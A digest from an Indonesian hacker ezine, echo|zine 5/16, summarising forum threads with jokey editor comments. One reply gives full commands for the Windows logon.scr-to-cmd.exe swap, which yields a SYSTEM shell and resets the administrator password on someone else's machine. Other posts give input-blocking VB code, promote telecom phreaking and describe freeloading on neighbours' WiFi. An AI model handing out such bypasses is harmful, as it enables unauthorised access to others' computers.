@@ -1,0 +1,433 @@
+echo|zine, volume 5 issue 16
+whats goin on ECHO forum?
+by anonymous-co-editor <anonymous<at>echo.or.id>
+
+        
+        
+        Kolom ini berisi rangkuman beberapa posting yang mungkin saja 
+menarik atau berguna buat kamu. Diselipi beberapa komentar "ringan" dari
+editor (tapi kadang lebih mirip lawakan Srimulat ;)). So here they are:
+
+------------------------------------------------------------------------
+
+http://echo.or.id/forum/viewtopic.php?t=5698
+--recovering memory cenderung lambat knapa?--
+
+************************************************************************
+From: doni_idan
+
+alo semuanya
+komputer saya jika dinyalakan pas pertama kali recovering memorynya lama sekali
+itu penyebabnya apa?
+sehingga komputer lelet
+tapppppi setelah 5 menitan normal kembali
+tapi aneh memory aku kan 256 ko normalnya di status memory antara 100 - 160
+sisanya kemana?
+trus system idle proses itu apa?
+tolong jelasin
+klo aku non aktive kan di task manager bakal menyebabkan apa?
+
+(editor's note: Ada yang tahu apa itu recovering memory? Apa maksudnya 
+wake up setelah hibernate?)
+
+************************************************************************
+From: Galieh_neH
+
+memory u mang 256.. kalo berkurang yah berarti digunakan oleh system 
+windows untuk menjalankan task2 di backgroundnya dia...
+
+misal nih q punya ram 512mb di task manager di bagian Performance di 
+Phisical Memory (K) tertulis:
+Total: 523756
+Available: 123908
+System Chace: 197396
+
+brarti ram kompie 512 setelah dipakai ma sistem tinggal 123mb so 123mb 
+itu sisa memori pisik kamu yg dapat digunakan untuk menjalankan aplikasi 
+lainnya...
+
+************************************************************************
+
+------------------------------------------------------------------------
+
+http://echo.or.id/forum/viewtopic.php?t=5241
+--MAK......TOLONG.........MAK...........--
+(Editor's note: Ini contoh anak yang nyari emaknya, tapi sayang malah nyasar
+ke Forum Echo. Kids, please use another suitable title, ya hear?)
+
+************************************************************************
+From: laskar toni
+
+AQ MAU nAnYA nih, ADA GAK SOFRWARE UNTUK MENJEBOL PASSWORD XP.DLL?
+
+************************************************************************
+
+From: AL_K
+
+Ngapain pake software ?
+Dapet dari situs tetangga nih!! Tapi kalo mo yang repot baca aja artikel 
+gw di jasakom.com !!
+
+This is straight for a brain child. It makes so much sense that no one 
+ever thought to do it. Enjoy. Also beware to change what you have done. 
+Or any machine that you did the hack on will show what you did when the 
+screen saver comes up. The only hard part is finding your way to C:\prompt 
+or ms-dos. So begin.
+
+If you can log in as an account , drop to DOS start -> run -> cmd, at the 
+C: prompt type the following (assuming default install locations)
+
+C:\> cd \winnt\system32
+C:\winnt\system32> copy logon.scr logon.scr.old
+C:\winnt\system32> del logon.scr
+C:\winnt\system32> copy cmd.exe logon.scr
+
+Now log off the machine, logon.scr is the screen saver that will kick in 
+after 15 minutes of not touching the keyboard/mouse at the logon screen. 
+Wait 15-20 minutes and a DOS prompt with FULL SYSTEM rights will pop up, 
+then just to
+
+C:\> net user administrator <newpassword>
+and then log in with the new account.
+
+Try this, might work, as long as he didn't change default permissions 
+on C:\winnt and C:\winnt\system32 you should be golden.
+
+************************************************************************
+
+------------------------------------------------------------------------
+
+http://echo.or.id/forum/viewtopic.php?t=5612
+--Jaringan Praktikum butuh saran--
+
+************************************************************************
+From: znsp13
+
+Abang-abang, sodara setanah air tercinta. Saya mau numpang tanya:
+1. Antivirus server komputer yang bagus untuk menghadapi masalah komputer 
+baik server/client yang tidak terhubung ke internet, tetapi masih memungkinkan 
+client untuk bisa memasukkan flash disk. Apa ya?
+
+2. Untuk menutup celah USB pake apa ya? Saya sudah coba set BIOS tetapi 
+masih bisa di jebol. Catatan: tidak pake software pembantu tetapi dari 
+settingan windows itu sendiri.
+
+3. Bagaimana caranya Agar login ke domain server 2003 menjadi cepat bagi client.
+
+Atas perhatian abang-abang saya ucapkan banyak terima kasih. Bravo Echo.
+
+(Editor's note: posting yang sangat sopan, contoh keberhasilan indoktrinasi
+P4 ala Orde Baru. We should produce more sophisticated gentleman like this...)
+
+************************************************************************
+From: lirva32
+
+1. Antivirusnya apa saja... yang penting sering di update. Jika memungkinkan 
+Anda bisa mempergunakan antivirus yang cukup update di server.. nanti 
+clientnya ga usah di update.. ya model2 Symantec Corporate lah....
+
+2. Kanepa harus ditutup....??? kaihan pemakai komputernya... serba dibatasi 
+sehingga mereka tidak bisa mengekplorasi diri.... kalau modelnya seperti ini 
+bangsa kita tidak akan pernah maju... itu pembubuhan karakter dan pembodohan 
+yang sangat keji... biarkan mereka bisa mengeplorasi diri...
+toh solusi yang terbaik Anda bisa pake model recovery jika terjadi disaster... 
+bisa pake : GoBack, CleanSlate, etc
+
+3. Kalo yg ini memang saya juga lagi riset ulang... krn baru 1 solusi.. 
+clietnnya harus clean install alias tidak bekas domain lain.
+
+
+.thx
+lirva32
+
+(editor's note: Ying selalu ketemu Yang, in this case, produksi Orba
+ketemu yang lagi demam reformasi ;) Asam di gunung, garam di laut, 
+ketemunya di Forum Echo ;) )
+
+************************************************************************
+
+------------------------------------------------------------------------
+http://echo.or.id/forum/viewtopic.php?t=5464
+-- The Complete History of Hacking --
+
+************************************************************************
+From: bima
+
+Mohon maaf, bagi yg sudah tahu, berikut ini file yang berisikan
+sejarah (h|cr)acking di dunia :
+
+http://www.geocities.com/iko94/ebook/The_Complete_History_of_Hacking.pdf
+
+tidak hanya itu, ada juga sejarah teknologi digital,robot,
+dan laen2.
+di file tsb anda juga akan tahu bagaimana masa muda dan sepak terjang
+orang2 yg sekarang menjadi legenda dunia persilatan... Smile
+
+kita berharap agar kita bisa mencontoh yg baik2 saja...
+misalnya bagaimana orang2 pintar tsb bersatu untuk
+membentuk suatu komunitas yg memiliki satu visi yg sama,
+sehingga mereka bisa bertukar pengalaman, informasi, juga
+hasil riset yg saling melengkapi.
+
+ok, akhirnya selamat membaca... Smile
+
+
+--------
+iko94.blogspot.com
+
+(editor's note: kapan ada e-book "The History of Corruption"? :)  Di 
+dalamnya bisa-bisa Indonesia yang mendominasi samapai perlu ada chapter 
+"How To Do Korupsi Berjamaah" atau "How to Fool KPK for Dummies")
+
+************************************************************************
+
+------------------------------------------------------------------------
+
+http://echo.or.id/forum/viewtopic.php?t=5410
+--gimana cara matiin fungsi keyboard?--
+
+************************************************************************
+From: flekzout
+
+permisi kk semuanya, mau tanya neh.. gimana yah caranya matiin function 
+keyboard kita? maksudnya kita bisa matiin abcdef.. 12345.. F1 F2 F3..., 
+ctrl+alt+del, alt+tab, dan lain lain.. bisa bantuin gak? soalnya perlu 
+neh mo buat tugas gitu perlu matiin beberapa tombol keyboard, ada gak 
+caranya pake program atau pake REGEDIT? cara matiin taskbar atau taskmanager 
+bisa gak? sorry yah byk nanya.. maklum rada bego neh.. thanks sebelumnya ^^
+
+(editor's note: Belajarlah cara bertanya yang baik. Poin-poin pertanyaan
+pisahkan ke baris-baris terpisah. Dan jangan terkesan memerintah "ada gak?"
+"bisa bantuin gak"? Guys, the people there stay and help you voluntarily,
+so treat them right! They don't need money, they just need a proper respect,
+can you do that, please?)
+
+************************************************************************
+
+From: husni
+
+Nih kalau mau... huehehehehhehe...
+
+	Code:
+	
+Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
+Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+Private Sub Form_Load()
+    BlockInput True
+End Sub 
+
+************************************************************************
+
+------------------------------------------------------------------------
+
+http://echo.or.id/forum/viewtopic.php?t=5443
+--Menjiplak karya orang laen ??? (SSH Private Key Cracker)--
+
+************************************************************************
+From: bima
+
+salam,
+hari ini sewaktu buka2 file ezine yg berhubungan dng php,
+me terkejut sewaktu membaca echo|zine volume 4, issue 13, January 15, 2006.
+kenapa ? karena salah satu isinya kok mirip dengan rilisnya THC (the 
+hacker's choice thn 2003), yaitu SSH Private Key Cracker.
+me membacanya lagi lebih teliti, membandingkannya dng milik THC,
+kok makin mirip ya ....
+me teliti lagi variabel dan alur logikanya, kok masih mirip ???
+me lalu lihat contoh cara kompile dan pemakaiannya, kok tetep
+mirip dng rilis THC ???
+ada apakah gerangan ini ???
+sebagai perbandingan, me melampirkan source code keduanya :
+ini milik THC : 
+<snip>
+(editor's note: check the related URL for complete source code)
+
+maaf, bukannya me bermaksud men-diskreditkan siapapun,
+hanya bermaksud memperjelas permasalahannya, apakah
+memang kebetulan saja atau pun ada hal2 lainnya ???
+me berharap ada penjelasan resmi dari pengarang ezine dng
+judul "SSH Private Key Cracker" ini ......
+
+
+di luar itu semua, me berharap, agar kita mau memberi
+respect / rasa hormat kepada para pengarang asli, baik itu
+paper atau program open source (apalagi closed source)
+dengan minimal mencantumkan credits atau disebutkan di
+references, sehingga ilmu pengetahuan itu serasa bertambah
+bagus dengan kehadirannya... (keuntungan lain : kita tidak
+akan diketawakan oleh penulis aslinya ataupun pembaca yg lain
+apabila di publish di forum internasional).
+
+terima kasih.
+
+
+./iko
+iko94.blogspot.com
+
+(editor's note: good catch Bima aka iko, anda sangat teliti. Next time,
+maybe we could appoint you as the external reviewer?)
+************************************************************************
+
+From: y3dips
+
+how if the real creator wrote it for echo zine. ;)
+
+or "somethin similar" :)
+just wait for "anonymous" confirmation about it, coz he is to busy like he is 
+dead already (hope not :D), so i cant contact him, anyway thx for this litle 
+finding :)
+
+regards
+---
+y3dips
+
+************************************************************************
+------------------------------------------------------------------------
+
+http://echo.or.id/forum/viewtopic.php?t=5637
+--FORUM KOMUNITAS PHREAKER INDONESIA (www.cyberphreaking.com)--
+
+************************************************************************
+From: jiddigaul
+
+Akhirnya selesai juga forumnya, buat rekan - rekan yang pengen share 
+phreaking lebih cepat langsung saja mendaftar di forumnya GRATIS kok 
+nggak bayar dan di sana banyak trik-trik bagaimana menjahili sistem 
+operator. Kalo tertama masuk forum ini yang tampil cuma menu PERATURAN 
+aja, tapi jangan kuatir begitu daftar dan login langsung bisa dapet 
+full akses ke forum Vbuletinnya. Di anatara isinya adalah :
+
+PHONE PHREAK :
+1. PSTN PHREAK
+2. CULLEULAR PHREAK
+3. PDA PHREAk
+
+PROVIDER PHREAK:
+1. TELKOMSEL PHREAK
+2. INDOSAT PHREAK
+3. EXELCOM PHREAK
+4. MOBILE 8 PHREAK
+5. ESIA PHREAK
+6. OPERATOR LAIN PHREAK
+
+DLL , masih banyak lagi yang bisa didapatkan dengan mendaftar di komunitas 
+ini. Nantikan juga Ebook Cyberphreaking versi 6.0 dalam waktu dekat ini.
+
+(Editor's note: Perhatikan kalau-kalau ada nick "menkominfo" ikutan 
+gabung ;) Jangan-jangan dia master phreakernya ;) No offense please, hehehe)
+
+************************************************************************
+
+------------------------------------------------------------------------
+
+http://echo.or.id/forum/viewtopic.php?t=5686
+--Pemrograman Port Pararel--
+
+************************************************************************
+From: bajoe
+
+Halooo
+mas bisa tanya tentang pemrograman port pararel alias interfacing...,kalo 
+di kontroler kalo ingin kirim data ke port tinggal pake perintah MOV Portnumber,data
+...,lha kalo ke port pararelnya komputer gimana mas...yang pake konektor DB25 
+itu lho...
+
+thankss.......
+
+(editor's note: since when "parallel" becomes "pararel"? Tolong yang konsisten
+jika menggunakan bahasa Indonesia atau bahasa Inggris)
+************************************************************************
+
+From: mr_orche
+
+kalo win9x pake bahasa pemrograman under dos (kalo aku biasa pake QuickBASIC). 
+tapi lebih mudah jelasin kalo pake assembler. berikut contoh kirim data 83H 
+ke port printer (paralel) pake assembler (alamat out port: 378, in port: 379):
+mov dx, 378
+mov al, 83
+out dx, al
+(int 20)
+
+utk perintah input:
+mov dx, 379
+in al, dx
+(int 20)
+
+kalo mo nyoba, pake DEBUG:
+C:>DEBUG
+-a (untuk menampilkan address, supaya bisa masukin perintah)
+XXXX:0100 mov dx, 378
+XXXX:01XX mov al, 83
+XXXX:01XX out dx, al
+XXXX:01XX int 20
+XXXX:01XX <enter>
+-g (untuk menjalankan program)
+
+perintah int 20 adalah perintah 'STOP PROGRAM'
+
+Kalo mau pake program visual (delphi/vb), perlu install driver port paralel. 
+Perintah I/O ke port paralel dilakukan dengan mengakses sub/fungsi dari 
+driver port paralel menggunakan API. Hati2 memilih driver port paralel, 
+karena ga semua bisa jalan di WinXP, sebagian besar hanya jalan di Win9x. 
+Kalo yang dah pernah aku coba di WinXP pake DLPortIO, cari aja pake search 
+engine.
+
+keywords yang mungkin membantu: paralel port, ECP, EPP, SPP
+
+DLPortIO tuh nama program yang menyediakan driver untuk port paralel. 
+Sebenarnya ada banyak driver port paralel, salah satunya PortIO.dll, tapi 
+terakhir aku nyoba, driver ini ga bisa jalan di WinXP. Kalo DLPortIO.dll 
+dah aku buktiin sendiri bisa jalan di WinXP.
+
+Mungkin perlu diketahui bahwa di Win9x perintah I/O pake program ASM atau 
+program under DOS yang menyediakan perintah I/O dapat dilakukan langsung 
+tanpa DLL. sedangkan di WinXP, perintah akses I/O tidak diijinkan untuk 
+aplikasi. Semua proses I/O hanya dapat dilakukan dengan meminta layanan I/O 
+ke driver hardware (dalam hal ini driver untuk port paralel).
+
+(editor's note: selamat, anda layak dapat Bintang! Karena tidak ada Bintang,
+tuak aja gimana? Atau bir temulawak? Atau Sprite campur Bodrex? You pick!)
+
+************************************************************************
+
+------------------------------------------------------------------------
+http://echo.or.id/forum/viewtopic.php?t=5676
+--Antenna Kaleng dan Bazooka--
+
+
+************************************************************************
+From: k1tk4t
+
+antenna kaleng menjadi sangat begitu terkenal di WiFi apalagi di kalangan 
+wardriving yang hobi nyari2 AP untuk Link Internet bahkan masuk ke Server 
+Database Lokal, nah kali ini saya memberikan link hasil buatan saya sendiri 
+yang memang terbukti kehebatan dari antenna kaleng ini:
+
+Antenna Kaleng konvensional [3/4 Panjang Gelombang]
+http://newhack.org/index.php?menu_id=13&article=48
+
+Bazooka Antenna | Super Cantenna [1.75 Panjang Gelombang]
+http://newhack.org/index.php?menu_id=13&article=49
+
+Dan untuk Kumpulan PIC dari antenna ini
+http://k1tk4t.newhack.org/bazooka/ <--- PIC Bazooka antenna WiFi
+http://k1tk4t.newhack.org/cantena/ <--- PIC antenna kaleng
+
+Lumayan bisa dapetin saluran VSAT [Via Saluran Antar Tetangga] alias numpang 
+jalur internet ..... ;)
+
+Selamat Mencoba...................
+
+(Editor's note: anak nakal memang, jangan lupa dengan metode SKSD (Sok Kenal
+Sok Dekat) andapun bisa nebeng internet gratis ;) caranya bawain tetangga anda
+sebakul nasi plus lauk pauk sambil ngomong "pinjem dong internetnya, plizzz?"
+;) )
+
+
+************************************************************************
+------------------------------------------------------------------------
+
+        That's all for now, people. Enjoy ...and...stay away from drugs, ok?
+And no smack down, kata nenek itu berbahaya!
+
+--anonymous co-editor--
